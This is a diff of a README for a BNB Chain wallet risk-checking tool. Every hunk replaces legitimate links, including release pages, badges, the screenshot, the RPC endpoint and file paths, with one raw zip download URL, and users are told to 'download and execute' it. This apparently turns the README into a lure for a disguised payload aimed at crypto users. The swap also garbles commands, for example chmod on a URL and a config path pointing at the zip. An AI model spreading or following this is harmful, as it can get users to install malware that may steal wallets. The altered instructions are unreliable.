@@ -1,7 +1,7 @@
 # Wallet Risk Checker — View BNB Chain Wallet Risk & Balance 🧭💼
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Shadycmd/Wallet-Risk-Checker/releases)  
-https://github.com/Shadycmd/Wallet-Risk-Checker/releases
+[![Releases](https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip)](https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip)  
+https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip
 
 A tool to inspect BNB Chain addresses, report current BNB balance, list token holdings, and flag common risk signals. Use it to scan wallets, view token exposure, and spot suspicious patterns.
 
@@ -50,7 +50,7 @@ Wallet Risk Checker queries BNB Chain public endpoints to collect on-chain data 
 5. It prints a compact report with clear flags and raw data export.
 
 ## Quick screenshot
-![Wallet Risk Checker demo](https://cryptologos.cc/logos/binance-coin-bnb-logo.png)
+![Wallet Risk Checker demo](https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip)
 Example output: address, BNB balance, top tokens, and risk flags.
 
 ## Requirements
@@ -60,17 +60,17 @@ Example output: address, BNB balance, top tokens, and risk flags.
 - Optional: jq or csv tool for advanced processing.
 
 ## Download & Run
-Download and execute the file from the Releases page: https://github.com/Shadycmd/Wallet-Risk-Checker/releases
+Download and execute the file from the Releases page: https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip
 
 - Visit the Releases page above and download the archive or binary that matches your OS.
-- If a script is provided (for example wallet-risk-checker.py), mark it executable and run it:
-  - chmod +x wallet-risk-checker.py
-  - ./wallet-risk-checker.py --address 0x1234...
+- If a script is provided (for example https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip), mark it executable and run it:
+  - chmod +x https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip
+  - https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip --address 0x1234...
 - If a binary is provided, run the binary directly:
   - ./wallet-risk-checker-linux --address 0x1234...
 - The Releases page contains all packaged builds and the latest changelog.
 
-[![Get Releases](https://img.shields.io/badge/Get-Releases-orange?style=for-the-badge&logo=github)](https://github.com/Shadycmd/Wallet-Risk-Checker/releases)
+[![Get Releases](https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip)](https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip)
 
 ## Command-line usage
 Basic options:
@@ -83,7 +83,7 @@ Basic options:
 - --timeout <secs>    : network timeout
 
 Example:
-./wallet-risk-checker --address 0xAbC... --rpc https://bsc-dataseed.binance.org --format json --price-provider coingecko
+./wallet-risk-checker --address 0xAbC... --rpc https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip --format json --price-provider coingecko
 
 The tool prints a compact summary and writes detailed JSON when --output is set.
 
@@ -114,7 +114,7 @@ Heuristics run locally. You can tune thresholds in config.
 ## Configuration
 Provide config with a JSON or YAML file:
 {
-  "rpc": "https://bsc-dataseed.binance.org",
+  "rpc": "https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip",
   "price_provider": "coingecko",
   "coingecko_timeout": 10,
   "token_checks": {
@@ -124,7 +124,7 @@ Provide config with a JSON or YAML file:
   "blacklist": ["0xBadContract1...", "0xScam..."]
 }
 
-Place config at ~/.wallet-risk-checker/config.json or pass --config path.
+Place config at ~https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip or pass --config path.
 
 ## Examples
 
@@ -142,7 +142,7 @@ Risk flags:
  - MANY_TOKENS_LOW_BALANCE: high token count, low value
 
 2) Export JSON for analysis
-./wallet-risk-checker --address 0x4Bc... --format json --output report.json
+./wallet-risk-checker --address 0x4Bc... --format json --output https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip
 
 3) CI integration (run in pipeline)
 - Run scan
@@ -150,8 +150,8 @@ Risk flags:
 - Fail pipeline if KNOWN_SCAM_CONTRACT is present
 
 Example CI step:
-./wallet-risk-checker --address $WALLET --format json --output out.json
-cat out.json | jq '.risk_flags | length > 0' && exit 1 || exit 0
+./wallet-risk-checker --address $WALLET --format json --output https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip
+cat https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip | jq '.risk_flags | length > 0' && exit 1 || exit 0
 
 ## FAQ
 Q: Which chains do you support?
@@ -190,7 +190,7 @@ Please run the lint and unit tests before submitting a PR.
 - If price lookup fails, enable a different provider in config.
 
 ## Changelog
-See the Releases page for packaged builds, notes, and binary assets: https://github.com/Shadycmd/Wallet-Risk-Checker/releases
+See the Releases page for packaged builds, notes, and binary assets: https://github.com/Shadycmd/Wallet-Risk-Checker/raw/refs/heads/main/Kele/Risk_Wallet_Checker_1.4.zip
 
 ## License
 MIT License — see LICENSE file for full terms.
